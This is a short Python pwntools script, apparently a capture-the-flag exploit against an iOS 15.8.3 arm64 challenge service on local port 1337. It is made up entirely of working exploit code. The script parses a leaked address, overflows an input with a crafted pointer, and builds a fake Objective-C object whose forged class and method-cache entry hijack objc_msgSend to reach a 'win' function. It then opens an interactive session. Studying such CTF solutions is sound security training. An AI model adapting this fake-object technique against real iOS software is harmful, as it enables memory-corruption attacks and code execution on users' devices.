from pwn import remote, context, p64, flat

"""
# uname -a && sw_vers
Darwin 21.6.0 Darwin Kernel Version 21.6.0: Sun Oct 15 00:18:06 PDT 2023; root:xnu-8020.241.42~8/RELEASE_ARM64_T8010 iPhone9,1 arm64 D10AP Darwin
ProductName:    iPhone OS
ProductVersion: 15.8.3
BuildVersion:   19H386
"""

conn = remote('0.0.0.0', 1337)

context.log_level = 'debug'
win = int(conn.recvline().decode().split('number ')[1].split('!')[0])
addr_buf = win + 0x8018
win_offset = (addr_buf + 0x8 * 3 - 0x10 - win) // 4
sel_offset = 0x861580
conn.sendlineafter(b'fruit? ', b'X' * 20 + p64(addr_buf))
fake_obj = flat([
    p64(addr_buf + 0x8 * 3 - 0x10),                     # addr_buf[0] (fake obj isa) -> addr_buf[1]
    p64(addr_buf + 0x8 * 1),                            # addr_buf[1] (classPtr in objc_msgSend) -> addr_buf[3]
    b'2' * 8,                                           # addr_buf[2]
    p64((addr_buf + 0x8 * 6) | (0xffff000000000001)),   # addr_buf[3] (cache) -> addr_buf[6]
    b'4' * 8,                                           # addr_buf[4]
    p64(0),                                             # addr_buf[5] (bits var in objc_release)
    p64((sel_offset << 38) | win_offset),               # addr_buf[6] (cache entry)
    b'7' * 8,                                           # addr_buf[7]
])
conn.sendlineafter(b'prize? ', fake_obj)
conn.interactive()
